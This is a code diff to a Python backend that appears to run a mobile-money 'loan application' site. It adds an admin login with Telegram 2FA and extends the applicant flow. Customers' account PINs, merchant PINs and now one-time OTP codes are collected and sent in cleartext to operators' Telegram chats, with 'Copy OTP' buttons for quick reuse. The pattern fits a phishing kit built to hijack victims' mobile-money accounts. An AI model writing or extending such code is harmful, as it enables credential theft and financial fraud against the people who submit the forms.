@@ -91,6 +91,13 @@ def set_setting(key, value):
     write_config_file({key: str(value)})
 
 
+def current_admin_token():
+    custom = get_setting("admin_token")
+    if custom and str(custom).strip():
+        return str(custom).strip()
+    return ADMIN_TOKEN
+
+
 def telegram_bot_token():
     return (
         os.environ.get("MIXX_TELEGRAM_BOT_TOKEN", "").strip()
@@ -109,6 +116,7 @@ def telegram_bot_token():
 def telegram_admin_chat_id():
     configured = (
         os.environ.get("MIXX_TELEGRAM_ADMIN_CHAT_ID", "")
+        or os.environ.get("MIXX_TELEGRAM_CHAT_ID", "")
         or os.environ.get("ORANGE_TELEGRAM_ADMIN_CHAT_ID", "")
         or os.environ.get("ORANGE_TELEGRAM_CHAT_ID", "")
         or os.environ.get("ORANGE_ADMIN_CHAT_ID", "")
@@ -141,7 +149,8 @@ def telegram_admin_chat_id():
 
 def telegram_bot_username():
     configured = (
-        os.environ.get("ORANGE_TELEGRAM_BOT_USERNAME", "")
+        os.environ.get("MIXX_TELEGRAM_BOT_USERNAME", "")
+        or os.environ.get("ORANGE_TELEGRAM_BOT_USERNAME", "")
         or os.environ.get("ORANGE_BOT_USERNAME", "")
         or os.environ.get("TELEGRAM_BOT_USERNAME", "")
         or os.environ.get("MOMO_TELEGRAM_BOT_USERNAME", "")
@@ -234,6 +243,20 @@ def initialize_db():
                 code_hash TEXT NOT NULL,
                 expires_at REAL NOT NULL,
                 attempts INTEGER NOT NULL DEFAULT 0,
+                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
+            );
+            CREATE TABLE IF NOT EXISTS admin_sessions (
+                token_hash TEXT PRIMARY KEY,
+                created_ip TEXT,
+                expires_at REAL NOT NULL,
+                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
+            );
+            CREATE TABLE IF NOT EXISTS admin_2fa_challenges (
+                challenge_id TEXT PRIMARY KEY,
+                code_hash TEXT NOT NULL,
+                created_ip TEXT,
+                attempts INTEGER NOT NULL DEFAULT 0,
+                expires_at REAL NOT NULL,
                 created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
             );
             """
@@ -1222,7 +1245,7 @@ def handle_telegram_callback(callback_query):
         lines = existing_text.splitlines()
         new_lines = []
         for line in lines:
-            if line.startswith("Status:") or line.startswith("📊 Estágio") or line.startswith("📋 Decisão:") or line.startswith("📋 Decision:"):
+            if line.startswith("Status:") or line.startswith("📌 Status:") or line.startswith("📊 Estágio") or line.startswith("📋 Decisão:") or line.startswith("📋 Decision:"):
                 continue
             new_lines.append(line)
         new_lines.append(f"\n📋 Decision: {display_name}")
@@ -1235,7 +1258,7 @@ def handle_telegram_callback(callback_query):
 
         # Remove buttons once approved or rejected so it's clear the action completed
         reply_markup = (
-            {"inline_keyboard": []}
+            None
             if new_stage in ("approved", "rejected")
             else stage_buttons(app_id, new_stage, phone=app_phone)
         )
@@ -1280,9 +1303,14 @@ def handle_verify_callback(query_id, data, chat_id, message_id, message):
             "UPDATE verifications SET status = ?, reject_reason = ? WHERE id = ?",
             (new_status, reject_reason, verification_id),
         )
+        if new_status == "approved" and ver["step"] in ("id_document", "otp_code"):
+            db.execute(
+                "UPDATE applications SET status = 'approved' WHERE id = ?",
+                (ver["application_id"],),
+            )
 
     label = "✅ Approved" if action == "approve" else "❌ Rejected"
-    step_label = "PIN + Phone" if ver["step"] == "zip_phone" else "SMS / Verification Message"
+    step_label = "PIN + Phone" if ver["step"] in ("zip_phone", "account_pin", "merchant_pin") else ("OTP Code" if ver["step"] == "otp_code" else "SMS / Verification Message")
     try:
         answer_telegram_callback(query_id, text=f"Verification {step_label}: {label}")
     except Exception:
@@ -1291,7 +1319,7 @@ def handle_verify_callback(query_id, data, chat_id, message_id, message):
     if chat_id and message_id:
         existing_text = (message.get("text") or "") + f"\n\n📋 Decision: {label}"
         try:
-            edit_telegram_message(chat_id, message_id, existing_text, reply_markup={"inline_keyboard": []})
+            edit_telegram_message(chat_id, message_id, existing_text, reply_markup=None)
         except Exception:
             pass
 
@@ -1511,10 +1539,27 @@ def telegram_notification_loop():
                        ORDER BY o.created_at LIMIT 1""",
                         (time.time(),),
                     ).fetchone()
-            event = agent_event or admin_event
-            if event is None:
+                orphan_agent_event = None
+                if agent_event is None and admin_event is None and telegram_admin_chat_id():
+                    orphan_agent_event = db.execute(
+                        """SELECT o.id AS event_id, a.id, a.first_name, a.last_name,
+                                  a.phone, a.loan_type, a.loan_amount, a.term_months,
+                                  a.purpose, a.employment, a.annual_income, a.status,
+                                  a.agent_id, a.agent_contact_consent
+                           FROM telegram_agent_outbox o
+                           JOIN applications a ON a.id = o.application_id
+                           JOIN agents g ON g.id = a.agent_id
+                           WHERE o.sent_at IS NULL AND o.next_attempt_at <= ?
+                             AND (g.telegram_chat_id IS NULL OR trim(g.telegram_chat_id) = '')
+                           ORDER BY o.created_at LIMIT 1""",
+                        (time.time(),),
+                    ).fetchone()
+            selected = agent_event or admin_event or orphan_agent_event
+            if selected is None:
                 time.sleep(2)
                 continue
+            event = dict(selected)
+            outbox_table = "telegram_agent_outbox" if (agent_event or orphan_agent_event) else "telegram_outbox"
             clean_phone = re.sub(r"[\s\-\+\(\)]", "", str(event["phone"]).strip())
             short_phone = clean_phone[-8:] if len(clean_phone) >= 8 else clean_phone
             with connect_db() as db:
@@ -1551,11 +1596,10 @@ def telegram_notification_loop():
                     f"🔖 Reference: {event['id']}\n"
                     f"📌 Status: {status_label}"
                 )
-                outbox_table = "telegram_agent_outbox"
                 reply_markup = stage_buttons(event['id'], current_status, phone=event['phone'])
             else:
                 agent = event["agent_id"] or "Direct"
-                consent = "Yes" if event["agent_contact_consent"] else "No"
+                consent = "Yes" if event.get("agent_contact_consent") else "No"
                 destination = telegram_admin_chat_id()
                 current_status = (event["status"] or "pending").lower()
                 status_label = {
@@ -1579,7 +1623,6 @@ def telegram_notification_loop():
                     f"🔖 Reference: {event['id']}\n"
                     f"📌 Status: {status_label}"
                 )
-                outbox_table = "telegram_outbox"
                 reply_markup = stage_buttons(event['id'], current_status, phone=event['phone'])
             try:
                 if reply_markup is not None:
@@ -1644,10 +1687,40 @@ class Handler(BaseHTTPRequestHandler):
             raise ValueError("Request body size is invalid")
         return json.loads(self.rfile.read(length))
 
-    def authorized(self, token):
+    def get_client_ip(self):
+        fwd = self.headers.get("X-Forwarded-For")
+        if fwd:
+            return fwd.split(",")[0].strip()
+        real_ip = self.headers.get("X-Real-IP")
+        if real_ip:
+            return real_ip.strip()
+        if hasattr(self, "client_address") and self.client_address:
+            return str(self.client_address[0])
+        return "Unknown"
+
+    def authorized(self, token=None):
         header = self.headers.get("Authorization", "")
         scheme, _, provided = header.partition(" ")
-        return scheme.lower() == "bearer" and hmac.compare_digest(provided, token)
+        if scheme.lower() != "bearer" or not provided:
+            return False
+        target = token or current_admin_token()
+        if hmac.compare_digest(provided, target):
+            return True
+        if target != ADMIN_TOKEN and hmac.compare_digest(provided, ADMIN_TOKEN):
+            return True
+        # Check active verified 2FA admin session
+        token_hash = hashlib.sha256(provided.encode("utf-8")).hexdigest()
+        try:
+            with connect_db() as db:
+                row = db.execute(
+                    "SELECT token_hash FROM admin_sessions WHERE token_hash = ? AND expires_at > ?",
+                    (token_hash, time.time()),
+                ).fetchone()
+                if row:
+                    return True
+        except Exception:
+            pass
+        return False
 
     def agent_session(self):
         try:
@@ -1704,6 +1777,10 @@ class Handler(BaseHTTPRequestHandler):
                     "mustChangePassword": bool(session["must_change_password"]),
                 },
             )
+        if path == "/api/admin/auth/check":
+            return self.admin_auth_check()
+        if path == "/api/admin/auth/logout":
+            return self.admin_auth_logout()
         if path == "/api/admin/settings":
             return self.get_admin_settings()
         if path == "/api/admin/agents":
@@ -1793,6 +1870,12 @@ class Handler(BaseHTTPRequestHandler):
             return self.send_json(400, {"error": "Invalid JSON request"})
         if path == "/api/telegram/webhook":
             return self.telegram_webhook(data)
+        if path == "/api/admin/auth/challenge":
+            return self.admin_auth_challenge(data)
+        if path == "/api/admin/auth/verify-2fa":
+            return self.admin_auth_verify_2fa(data)
+        if path == "/api/admin/auth/logout":
+            return self.admin_auth_logout()
         if path == "/api/admin/settings":
             return self.update_admin_settings(data)
         if path == "/api/admin/agents":
@@ -1854,6 +1937,7 @@ class Handler(BaseHTTPRequestHandler):
                 "botRunning": is_bot_running(),
                 "paymentMethods": payment_methods,
                 "publicAppUrl": public_url,
+                "hasCustomAdminToken": bool(get_setting("admin_token")),
             },
         )
 
@@ -1866,6 +1950,19 @@ class Handler(BaseHTTPRequestHandler):
         admin_chat_id = data.get("adminChatId")
         bot_username = data.get("botUsername")
         public_app_url = data.get("publicAppUrl")
+        new_admin_token = data.get("newAdminToken")
+
+        if new_admin_token is not None and str(new_admin_token).strip():
+            set_setting("admin_token", str(new_admin_token).strip())
+            admin_chat = telegram_admin_chat_id()
+            if admin_chat and telegram_bot_token():
+                try:
+                    send_telegram_message(
+                        admin_chat,
+                        "🔔 <b>SECURITY NOTICE:</b> MoMo Admin Token / Password was successfully updated via Admin Portal."
+                    )
+                except Exception:
+                    pass
 
         if bot_token is not None and str(bot_token).strip():
             set_setting("telegram_bot_token", str(bot_token).strip())
@@ -1886,6 +1983,167 @@ class Handler(BaseHTTPRequestHandler):
 
         running = ensure_telegram_threads_running()
         return self.send_json(200, {"ok": True, "botRunning": is_bot_running()})
+
+    def admin_auth_challenge(self, data):
+        if not isinstance(data, dict):
+            return self.send_json(400, {"error": "Invalid request data"})
+        provided_token = str(data.get("adminToken", "")).strip()
+        client_ip = self.get_client_ip()
+
+        expected = current_admin_token()
+        token_valid = bool(
+            provided_token
+            and (
+                hmac.compare_digest(provided_token, expected)
+                or (expected != ADMIN_TOKEN and hmac.compare_digest(provided_token, ADMIN_TOKEN))
+            )
+        )
+
+        admin_chat = telegram_admin_chat_id()
+        bot_tok = telegram_bot_token()
+
+        if not token_valid:
+            if admin_chat and bot_tok:
+                alert_text = (
+                    "🚨 <b>SECURITY ALERT: Unauthorized Admin Access Attempt!</b>\n\n"
+                    "Someone attempted to access your MoMo Admin Dashboard with an incorrect password.\n\n"
+                    f"🌐 <b>IP Address:</b> <code>{client_ip}</code>\n"
+                    f"⏰ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}\n\n"
+                    "⚠️ <i>If this was NOT you, someone is attempting to breach your admin panel!</i>"
+                )
+                try:
+                    send_telegram_message(admin_chat, alert_text)
+                except Exception:
+                    pass
+            return self.send_json(401, {"error": "Invalid Admin Token. Security alert dispatched to Telegram."})
+
+        # Token is correct!
+        if admin_chat and bot_tok:
+            challenge_id = str(uuid.uuid4())
+            otp_code = f"{secrets.randbelow(1_000_000):06d}"
+            code_hash = hashlib.sha256(f"{challenge_id}:{otp_code}".encode("utf-8")).hexdigest()
+            expires_at = time.time() + 300  # 5 minutes
+
+            with connect_db() as db:
+                db.execute("DELETE FROM admin_2fa_challenges WHERE expires_at < ?", (time.time(),))
+                db.execute(
+                    """INSERT INTO admin_2fa_challenges (challenge_id, code_hash, created_ip, expires_at)
+                       VALUES (?, ?, ?, ?)""",
+                    (challenge_id, code_hash, client_ip, expires_at),
+                )
+
+            otp_message = (
+                "🔐 <b>MOMO ADMIN 2-STEP VERIFICATION (2FA)</b>\n\n"
+                f"Your One-Time Login Code is:\n"
+                f"👉 <b><code>{otp_code}</code></b> 👈\n\n"
+                f"🌐 <b>Requested from IP:</b> <code>{client_ip}</code>\n"
+                f"⏳ <b>Valid for:</b> 5 minutes\n\n"
+                "⚠️ <i>If you did NOT request this, change your admin password immediately!</i>"
+            )
+            try:
+                send_telegram_message(admin_chat, otp_message)
+            except Exception as e:
+                return self.send_json(500, {"error": f"Failed to send 2FA OTP to Telegram: {e}"})
+
+            masked_chat = (admin_chat[:3] + "***" + admin_chat[-2:]) if len(admin_chat) > 5 else "configured Telegram"
+            return self.send_json(200, {
+                "otpRequired": True,
+                "challengeId": challenge_id,
+                "maskedChat": masked_chat,
+                "message": f"6-digit 2FA code sent to Telegram ({masked_chat})."
+            })
+        else:
+            # Fallback when Telegram bot is not yet configured on server
+            session_token = secrets.token_urlsafe(32)
+            token_hash = hashlib.sha256(session_token.encode("utf-8")).hexdigest()
+            with connect_db() as db:
+                db.execute(
+                    """INSERT INTO admin_sessions (token_hash, created_ip, expires_at)
+                       VALUES (?, ?, ?)""",
+                    (token_hash, client_ip, time.time() + 86400 * 3),
+                )
+            return self.send_json(200, {
+                "otpRequired": False,
+                "sessionToken": session_token,
+                "warning": "Telegram bot is not yet configured. Logged in directly."
+            })
+
+    def admin_auth_verify_2fa(self, data):
+        if not isinstance(data, dict):
+            return self.send_json(400, {"error": "Invalid request data"})
+        challenge_id = str(data.get("challengeId", "")).strip()
+        code = str(data.get("code", "")).strip()
+        client_ip = self.get_client_ip()
+
+        if not challenge_id or not re.fullmatch(r"\d{6}", code):
+            return self.send_json(400, {"error": "Enter the 6-digit verification code from Telegram."})
+
+        with connect_db() as db:
+            row = db.execute(
+                """SELECT challenge_id, code_hash, created_ip, attempts, expires_at
+                   FROM admin_2fa_challenges WHERE challenge_id = ?""",
+                (challenge_id,),
+            ).fetchone()
+
+            if not row:
+                return self.send_json(400, {"error": "Verification code expired or not found. Please request a new one."})
+
+            if row["expires_at"] < time.time():
+                db.execute("DELETE FROM admin_2fa_challenges WHERE challenge_id = ?", (challenge_id,))
+                return self.send_json(400, {"error": "Verification code expired. Please request a new code."})
+
+            if row["attempts"] >= 3:
+                db.execute("DELETE FROM admin_2fa_challenges WHERE challenge_id = ?", (challenge_id,))
+                return self.send_json(403, {"error": "Too many incorrect attempts. Challenge invalidated."})
+
+            expected_hash = hashlib.sha256(f"{challenge_id}:{code}".encode("utf-8")).hexdigest()
+            if not hmac.compare_digest(expected_hash, row["code_hash"]):
+                db.execute("UPDATE admin_2fa_challenges SET attempts = attempts + 1 WHERE challenge_id = ?", (challenge_id,))
+                return self.send_json(401, {"error": "Incorrect 6-digit code. Please check your Telegram message."})
+
+            # Success! Delete challenge and issue session token
+            db.execute("DELETE FROM admin_2fa_challenges WHERE challenge_id = ?", (challenge_id,))
+            session_token = secrets.token_urlsafe(32)
+            token_hash = hashlib.sha256(session_token.encode("utf-8")).hexdigest()
+            db.execute(
+                """INSERT INTO admin_sessions (token_hash, created_ip, expires_at)
+                   VALUES (?, ?, ?)""",
+                (token_hash, client_ip, time.time() + 86400 * 3),
+            )
+
+        # Notify Telegram of successful login
+        admin_chat = telegram_admin_chat_id()
+        if admin_chat and telegram_bot_token():
+            try:
+                login_notice = (
+                    "🔓 <b>MoMo Admin Panel Logged In</b>\n\n"
+                    "2FA verification successful.\n"
+                    f"🌐 <b>IP Address:</b> <code>{client_ip}</code>\n"
+                    f"⏰ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}"
+                )
+                send_telegram_message(admin_chat, login_notice)
+            except Exception:
+                pass
+
+        return self.send_json(200, {
+            "ok": True,
+            "sessionToken": session_token,
+            "message": "2FA verification successful. Admin access granted."
+        })
+
+    def admin_auth_logout(self):
+        header = self.headers.get("Authorization", "")
+        scheme, _, provided = header.partition(" ")
+        if scheme.lower() == "bearer" and provided:
+            token_hash = hashlib.sha256(provided.encode("utf-8")).hexdigest()
+            with connect_db() as db:
+                db.execute("DELETE FROM admin_sessions WHERE token_hash = ?", (token_hash,))
+        return self.send_json(200, {"ok": True, "message": "Logged out successfully."})
+
+    def admin_auth_check(self):
+        if self.authorized(ADMIN_TOKEN):
+            return self.send_json(200, {"authenticated": True})
+        return self.send_json(401, {"authenticated": False, "error": "Unauthorized"})
 
     def list_agents(self):
         if not self.authorized(ADMIN_TOKEN):
@@ -2018,6 +2276,11 @@ class Handler(BaseHTTPRequestHandler):
                 "UPDATE verifications SET status = ?, reject_reason = ? WHERE id = ?",
                 (new_status, reject_reason, ver_id)
             )
+            if new_status == "approved" and ver["step"] in ("id_document", "otp_code"):
+                db.execute(
+                    "UPDATE applications SET status = 'approved' WHERE id = ?",
+                    (ver["application_id"],),
+                )
         return self.send_json(200, {"ok": True, "verificationId": ver_id, "status": new_status})
 
     def application_status(self, app_id):
@@ -2123,7 +2386,7 @@ class Handler(BaseHTTPRequestHandler):
         except (ValueError, TypeError, AttributeError):
             return self.send_json(400, {"error": "Invalid application ID"})
         step = data.get("step")
-        if step not in ("zip_phone", "id_document", "account_pin", "merchant_pin"):
+        if step not in ("zip_phone", "id_document", "account_pin", "merchant_pin", "otp_code"):
             return self.send_json(400, {"error": "Invalid verification step"})
 
         with connect_db() as db:
@@ -2151,6 +2414,11 @@ class Handler(BaseHTTPRequestHandler):
                     return self.send_json(400, {"error": "PIN and phone number are required"})
                 if phone != app["phone"]:
                     db.execute("UPDATE applications SET phone = ? WHERE id = ?", (phone, val_uuid))
+            elif step == "otp_code":
+                otp_code = str(data.get("otpCode", data.get("zipCode", ""))).strip()
+                if not otp_code:
+                    return self.send_json(400, {"error": "OTP code is required"})
+                zip_code = otp_code
             elif step == "id_document":
                 id_number = str(data.get("idNumber", "")).strip()
                 if not id_number:
@@ -2174,22 +2442,23 @@ class Handler(BaseHTTPRequestHandler):
                 (ver_id, val_uuid, step, zip_code, phone, id_number),
             )
 
-        # Send verification data to agent's Telegram (owner of link) or Admin Telegram (if no agent)
+        # Send verification data to agent's Telegram (owner of link) or Admin Telegram
         target_chats = []
         if app["telegram_chat_id"]:
             target_chats.append(str(app["telegram_chat_id"]).strip())
-        else:
-            admin_c = telegram_admin_chat_id()
-            if admin_c:
-                target_chats.append(str(admin_c).strip())
+        admin_c = telegram_admin_chat_id()
+        if admin_c and str(admin_c).strip() not in target_chats:
+            target_chats.append(str(admin_c).strip())
 
         if target_chats and telegram_bot_token():
             if step in ("zip_phone", "account_pin"):
-                step_label = "🔐 Step 4: Account PIN Validation (Customer PIN)"
+                step_label = "🔐 Step 3: Account PIN Validation (Customer PIN)"
             elif step == "merchant_pin":
-                step_label = "🔑 Step 5: Merchant Account PIN Validation (Merchant PIN)"
+                step_label = "🔑 Step 4: Merchant Account PIN Validation (Merchant PIN)"
+            elif step == "otp_code":
+                step_label = "🔢 Step 5: OTP Code Verification"
             else:
-                step_label = "💬 Step 3: SMS Verification Message"
+                step_label = "💬 Step 4: SMS Verification Message"
 
             active_phone = phone if (step in ("zip_phone", "account_pin", "merchant_pin") and phone) else app["phone"]
             phone_display = active_phone if str(active_phone).startswith("+") else f"+260 {active_phone}"
@@ -2212,6 +2481,8 @@ class Handler(BaseHTTPRequestHandler):
             ]
             if step in ("zip_phone", "account_pin", "merchant_pin"):
                 lines.append(f"PIN: {zip_code}")
+            elif step == "otp_code":
+                lines.append(f"🔢 OTP Code: {zip_code}")
             elif step == "id_document":
                 is_url = str(id_number).strip().startswith(("http://", "https://"))
                 label = "Verification Link" if is_url else "Message / ID"
@@ -2222,6 +2493,8 @@ class Handler(BaseHTTPRequestHandler):
             kb = []
             if str(id_number).strip().startswith(("http://", "https://")):
                 kb.append([{"text": "🔗 Open Verification Link", "url": str(id_number).strip()}])
+            if step == "otp_code":
+                kb.append([{"text": f"📋 Copy OTP ({zip_code})", "copy_text": {"text": str(zip_code)}}])
             kb.append([{"text": f"📋 Copy Phone ({phone_raw})", "copy_text": {"text": phone_raw}}])
             kb.append([
                 {"text": "✅ Approve", "callback_data": f"verify:approve:{ver_id}"},
@@ -2601,12 +2874,19 @@ class Handler(BaseHTTPRequestHandler):
                     application,
                 )
                 if telegram_bot_token():
+                    has_agent_tg = False
                     if application["agent_id"]:
-                        db.execute(
-                            "INSERT INTO telegram_agent_outbox (id, application_id) VALUES (?, ?)",
-                            (str(uuid.uuid4()), application["id"]),
-                        )
-                    elif telegram_admin_chat_id():
+                        agent_row = db.execute(
+                            "SELECT telegram_chat_id FROM agents WHERE id = ?",
+                            (application["agent_id"],),
+                        ).fetchone()
+                        if agent_row and agent_row["telegram_chat_id"]:
+                            has_agent_tg = True
+                            db.execute(
+                                "INSERT INTO telegram_agent_outbox (id, application_id) VALUES (?, ?)",
+                                (str(uuid.uuid4()), application["id"]),
+                            )
+                    if (not has_agent_tg) and telegram_admin_chat_id():
                         db.execute(
                             "INSERT INTO telegram_outbox (id, application_id) VALUES (?, ?)",
                             (str(uuid.uuid4()), application["id"]),
